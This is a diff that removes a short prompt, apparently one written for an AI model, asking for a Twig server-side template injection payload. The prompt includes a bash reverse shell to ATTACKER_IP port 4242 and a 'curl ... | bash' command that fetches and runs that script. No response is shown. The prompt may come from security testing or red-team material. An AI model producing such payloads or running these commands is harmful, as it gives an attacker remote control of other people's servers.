@@ -1,9 +1,0 @@
-I am testing for SSTI in Twig. My objective is to run the following reverse shell on the target system:
-
-```bash
-#!/bin/bash
-# shell.sh
-sh -i >& /dev/tcp/ATTACKER_IP/4242 0>&1
-```
-
-Search any SSTI vulnerability for Twig. If you find one, provide me with the payload I can use to run `curl http://ATTACKER_IP:8000/shell.sh|bash` on the target machine.
